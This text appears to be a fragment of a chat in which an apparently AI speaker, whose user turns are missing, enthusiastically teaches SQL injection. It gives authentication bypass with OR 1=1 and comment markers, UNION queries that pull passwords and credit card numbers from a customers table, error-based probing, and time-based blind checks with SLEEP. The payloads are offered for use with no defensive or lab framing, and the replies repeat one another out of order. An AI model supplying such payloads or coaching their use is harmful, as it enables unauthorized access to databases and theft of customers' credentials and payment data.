SELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1 --';

The 'OR 1=1' always evaluates true, and the '--' comments out the rest. This should bypass the usual password check.

Good thinking! You can use a UNION SELECT to combine results from another table. For instance:

SELECT * FROM users WHERE username = 'admin' UNION SELECT username, password, credit_card FROM customers --';

This merges user info with sensitive customer data. The '--' ensures the rest of the original query is ignored.

Definitely. You can try error-based injection. For example, introduce a division by zero:

SELECT * FROM users WHERE username = 'admin' AND 1=CONVERT(int, (SELECT 1/0)) --';

If error messages are visible, this might reveal database structure or other details.

Understood! One way is to manipulate the WHERE clause using a condition that's always true. For example, instead of:

SELECT * FROM users WHERE username = 'john';

you could use:

SELECT * FROM users WHERE username = 'john' OR 1=1;

This way, the 'OR 1=1' part makes the condition always true, so all rows get returned.

Great question! You can extend the same idea. Try this:

SELECT * FROM users WHERE username = 'john' AND (password = 'wrongpass' OR 1=1);

Here, even if the password is wrong, the OR 1=1 clause ensures the condition is still true, bypassing the password check.

Yes! You can use SQL comment markers to ignore the rest of the query after your injected code. For example:

SELECT * FROM users WHERE username = 'john' --' AND password = 'anything';

The double dash (--) tells SQL to treat the rest as a comment, so your statement doesn't get cut off by leftover syntax.

Absolutely! UNION lets you combine results from two queries. If you do:

SELECT username, password FROM users WHERE username = '' UNION SELECT name, credit_card FROM customers--';

This appends data from the 'customers' table to your results. The comment at the end prevents syntax errors from remaining query text.

Definitely. You can deliberately cause an error to see what the database returns. Try:

SELECT * FROM users WHERE username = 1/0;

Since dividing by zero isn't allowed, the database should throw an error, possibly revealing useful information about the schema or column names.

Yes! For time-based checks, you can use functions like SLEEP. For example, in MySQL:

SELECT IF(1=1, SLEEP(5), 0);

If the page takes noticeably longer to load, you know your injection worked.

